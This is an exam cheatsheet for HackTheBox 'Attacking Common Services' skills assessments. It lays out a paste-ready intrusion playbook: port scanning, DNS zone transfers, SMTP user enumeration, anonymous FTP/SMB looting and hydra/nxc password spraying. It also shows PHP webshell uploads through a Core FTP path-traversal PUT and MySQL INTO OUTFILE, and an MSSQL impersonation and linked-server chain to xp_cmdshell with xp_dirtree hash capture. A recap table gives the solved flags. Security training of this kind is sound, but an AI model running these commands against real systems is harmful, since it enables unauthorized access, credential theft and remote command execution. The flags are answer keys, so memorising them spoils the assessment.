# Attacking Common Services — Exam Cheatsheet

**Distilled from ACS Skills Assessments I/II/III (May 2026).** Open this during the exam.

---

## The Universal Methodology (memorize this)

```
1. nmap -Pn -sC -sV -p- --min-rate 2000 $target          # know every port
2. FREE RECON before brute-forcing anything:
     - DNS  → dig AXFR @target $domain
     - SMTP → smtp-user-enum -M RCPT -U names.txt -D $domain
     - SMB  → nxc smb $target -u guest -p '' --shares
     - FTP  → anonymous on EVERY ftp port
     - SNMP → snmpwalk -v2c -c public
     - NFS  → showmount -e
3. Loot anything readable. Read EVERY note/txt file.
4. Build combined user + password wordlists from loot.
5. Spray creds across EVERY auth surface (ssh, pop3, ftp, mssql, winrm, rdp, smb).
6. With creds → enumerate permissions → privesc → flag.
```

> **Forever rule:** Username enumeration & loot recon BEFORE password attack. Names list BEFORE role list.
> Role-based names (admin/hr/sales) almost never work on HTB ACS boxes — use `names.txt` / HTB `users.list`.

---

## Stage 1 — Recon Snippets (paste-ready)

```bash
export target=10.129.X.X
export domain=inlanefreight.htb
echo "$target $domain ns.$domain int-ftp.$domain mail.$domain" | sudo tee -a /etc/hosts

nmap -Pn -sC -sV -p- --min-rate 2000 -oA /tmp/scan $target
```

### DNS (port 53)
```bash
dig AXFR @$target $domain                    # leaks internal hosts → MORE TARGETS
dig any @$target $domain
```

### SMB (445)
```bash
nxc smb $target -u '' -p ''       --shares           # null
nxc smb $target -u 'guest' -p ''  --shares           # ⚡ Server 2019 default
smbclient -N -L //$target
smbclient -N //$target/SHARE -c 'prompt OFF; recurse ON; mget *'
```

### SMTP (25/587)
```bash
smtp-user-enum -M RCPT -U /tmp/htb_lists/users.list -t $target -D $domain
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $target
# fallback list: /usr/share/seclists/Usernames/Names/names.txt (10713 names)
```
> hMailServer drops RCPT for non-local domains → `-D <domain>` is MANDATORY.
> Manual `swaks` RCPT often fails (530 AUTH); `smtp-user-enum` works because it sends MAIL FROM first.

### FTP (21 / 2121 / 30021 / nonstd)
```bash
for p in 21 2121 30021; do
  echo "=== port $p ==="
  curl -s --max-time 5 "ftp://anonymous:x@$target:$p/"
done
ftp -n $target <port>           # then: user anonymous; passive; ls; mget *
```
> **Try EVERY FTP port with anonymous.** One may reject, another accepts.

### MSSQL (1433)
```bash
nxc mssql $target -u guest -p '' --local-auth           # blank
nxc mssql $target -u sa    -p '' --local-auth
mssqlclient.py -windows-auth USER@$target               # impacket
```

### Other quick wins
```bash
snmpwalk -v2c -c public $target
showmount -e $target                # NFS
onesixtyone -c community.txt $target
ldapsearch -H ldap://$target -x -s base namingcontexts
```

---

## Stage 2 — Loot → Wordlist Builder

Anything you find: `notes.txt`, `mynotes.txt`, `creds.txt`, `secrets.txt`, `random.txt`, `information.txt`, `*.kdbx`, `WebServersInfo.txt`, `docs.txt`, `.bash_history`, `.viminfo`.

```bash
mkdir -p /tmp/loot && cd /tmp/loot
# After dumping all txt files:
cat */*.txt | tr -d '\r' | sort -u > /tmp/loot/pws.txt
printf '%s\n' sa john fiona simon administrator root admin > /tmp/loot/users.txt
# Add any usernames seen in loot:
grep -oE '[A-Za-z][A-Za-z0-9._-]{2,}' */*.txt | sort -u >> /tmp/loot/users.txt
sort -u /tmp/loot/users.txt -o /tmp/loot/users.txt
```

---

## Stage 3 — Credential Spray Matrix

```bash
# SSH / POP3 / FTP (Linux PAM stack — same creds usually work everywhere)
hydra -L users.txt -P pws.txt $target ssh   -t 4 -F
hydra -L users.txt -P pws.txt $target pop3  -t 4 -F
hydra -L users.txt -P pws.txt -s 2121 $target ftp -t 4 -F

# SMB / WinRM / RDP / MSSQL (Windows)
nxc smb    $target -u users.txt -p pws.txt --continue-on-success
nxc winrm  $target -u users.txt -p pws.txt --continue-on-success
nxc rdp    $target -u users.txt -p pws.txt --continue-on-success
nxc mssql  $target -u users.txt -p pws.txt --local-auth --continue-on-success

# Web basic
hydra -L users.txt -P pws.txt $target https-get / -t 4 -F

# Last resort: rockyou (only after loot fails)
hydra -l USER -P /usr/share/wordlists/rockyou.txt -f ftp://$target
```

> If SSH rejects but POP3 accepts → still a foothold. Linux ACS boxes often have `PasswordAuthentication no` for some users — Dovecot is the easiest backdoor.
> **`--local-auth` is required** when MSSQL login is mapped to a Windows local account (not a SQL login). And remember `sa` is often disabled.

---

## Stage 4 — Service-Specific Killers

### Core FTP HTTPS (path traversal PUT → webshell)
Pattern: Core FTP serves on 443, XAMPP Apache on 80, both share `C:\`.

```bash
echo '<?php echo shell_exec($_GET["c"]); ?>' > /tmp/shell.php
curl -k -X PUT -H "Host: $target" --basic -u USER:PASS \
  --data-binary @/tmp/shell.php --path-as-is \
  "https://$target/../../../xampp/htdocs/shell.php"
curl "http://$target/shell.php?c=type+C:\Users\Administrator\Desktop\flag.txt"
```
> `--path-as-is` is **REQUIRED** (otherwise curl collapses `../`). XAMPP Apache runs as **SYSTEM** by default.

### MySQL / MariaDB → INTO OUTFILE webshell
```bash
mysql -h $target -u USER -pPASS --ssl=FALSE -e \
 "SELECT \"<?php echo shell_exec(\$_GET['c']);?>\" INTO OUTFILE 'C:\\\\xampp\\\\htdocs\\\\sh.php';"
```
> Don't brute MariaDB early — `max_connect_errors` will ban your VPN IP.

### MSSQL — full enum + privesc playbook
```bash
# As soon as you have any MSSQL login:
nxc mssql $target -u U -p P -q "SELECT IS_SRVROLEMEMBER('sysadmin'), SYSTEM_USER"

# If NOT sysadmin:
nxc mssql $target -u U -p P -q "
  SELECT distinct b.name FROM sys.server_permissions a
  JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id
  WHERE a.permission_name='IMPERSONATE'"

nxc mssql $target -u U -p P -q "SELECT name, is_linked, data_access FROM sys.servers"
```

**Self-linked-server / impersonation chain** (the Hard trick):
```sql
-- Use EXEC ('...') AT, NOT OPENQUERY (OPENQUERY drops impersonation → ANONYMOUS LOGON)
EXECUTE AS LOGIN='john'; EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED.SRV]
EXECUTE AS LOGIN='john'; EXEC ('sp_configure ''show advanced options'',1; RECONFIGURE') AT [LINKED.SRV]
EXECUTE AS LOGIN='john'; EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE')        AT [LINKED.SRV]
EXECUTE AS LOGIN='john'; EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LINKED.SRV]
```
**Rules:**
- Run each statement as a SEPARATE `nxc -q` (don't chain `sp_configure` inside one `EXEC ('...')` — parser chokes).
- Doubled single quotes inside `EXEC ('...')`.
- Use single-quoted shell args + `\\` in Windows paths to dodge zsh eating `\U`/`\D`.

**MSSQL forever-rule:**
> 1. `IS_SRVROLEMEMBER('sysadmin')` first.
> 2. If 0 → enum `sys.server_permissions` for IMPERSONATE grants.
> 3. Enum `sys.servers` for linked servers.
> 4. For each impersonatable login × each linked server: `EXECUTE AS LOGIN='X'; EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [link]`.
> 5. First row returning `1` is your sysadmin path.

### MSSQL — direct sa shortcuts (when you ARE sysadmin)
```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Hashes via responder:
EXEC xp_dirtree '\\10.10.14.X\share\',1,1
EXEC xp_subdirs '\\10.10.14.X\x'
```

### ProFTPD
- Two instances are common (e.g. 2121 + 30021). Anon may differ per port.
- CVE-2015-3306 `mod_copy` RCE via `SITE CPFR/CPTO` if mod_copy is loaded.

### Dovecot POP3 (110/995)
- PAM-backed → cred reuse with system users almost always works.
- Easiest backdoor when SSH `PasswordAuthentication no`.

---

## Stage 5 — Common Flag Locations

| OS      | Path                                            |
|---------|-------------------------------------------------|
| Windows | `C:\Users\Administrator\Desktop\flag.txt`       |
| Windows | `C:\Users\<user>\Desktop\flag.txt`              |
| Linux   | `/home/<user>/flag.txt`                         |
| Linux   | `/root/flag.txt`                                |

---

## STUCK? Triage Checklist

| Symptom | Try |
|---------|-----|
| SMB null denied | `guest:''` (Server 2019 default) |
| smtp-user-enum 0 hits | wrong wordlist — use `names.txt`, NOT roles; add `-D <domain>` |
| FTP anon empty `ls` | `passive` ON (or OFF — flip it) |
| MSSQL `sa` won't auth | `sa` is disabled; spray Windows accounts with `--local-auth` |
| OPENQUERY → "ANONYMOUS LOGON" | switch to `EXEC ('...') AT [link]` |
| `EXEC ('sp_configure...; sp_configure...')` syntax error | split into separate batches |
| zsh ate `\U` / `\D` in path | single-quote outer arg, double `\\` inner |
| Hydra rate-limited on SSH | switch to POP3 (Dovecot — no default lockout) |
| MariaDB connection refused after brute | you got `max_connect_errors` banned — restart VPN |
| Core FTP PUT lands in CoreFTP root | add `--path-as-is` and traverse `../../../xampp/htdocs/` |
| Brute taking forever | STOP. Did you do free recon? AXFR? guest SMB? anon FTP? |

---

## Wordlists Cheat Reference

| File | When |
|------|------|
| `/tmp/htb_lists/users.list` | HTB ACS module list — try FIRST for SMTP RCPT |
| `/usr/share/seclists/Usernames/Names/names.txt` | 10713 first names — SMTP fallback |
| `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` | small list for SSH/RDP |
| `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt` | quick spray |
| `/usr/share/wordlists/rockyou.txt` | LAST resort, FTP/web only (slow on SSH) |
| LOOT wordlist | ALWAYS try this first when you have any |

---

## ACS Skills Assessment Recap (what worked)

| Box | Foothold | Privesc | Flag |
|-----|----------|---------|------|
| Easy   | smtp-user-enum (RCPT,names,-D dom) → fiona; hydra rockyou ftp → 987654321 | Core FTP HTTPS path-traversal PUT → XAMPP shell as SYSTEM | `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}` |
| Medium | dig AXFR → anon FTP port 30021 → simon/mynotes.txt loot | hydra spray loot → simon SSH | `HTB{1qay2wsx3EDC4rfv_M3D1UM}` |
| Hard   | nxc smb guest:'' → Home share loot → nxc mssql `--local-auth` spray → fiona | IMPERSONATE john → `EXEC AT [LOCAL.TEST.LINKED.SRV]` = sa → xp_cmdshell | `HTB{46u$!n9_l!nk3d_$3rv3r$}` |

Detailed writeups:
- [17-Skills_Assessment_Easy.md](17-Skills_Assessment_Easy.md)
- [18-Skills_Assessment_Medium.md](18-Skills_Assessment_Medium.md)
- [19-Skills_Assessment_Hard.md](19-Skills_Assessment_Hard.md)
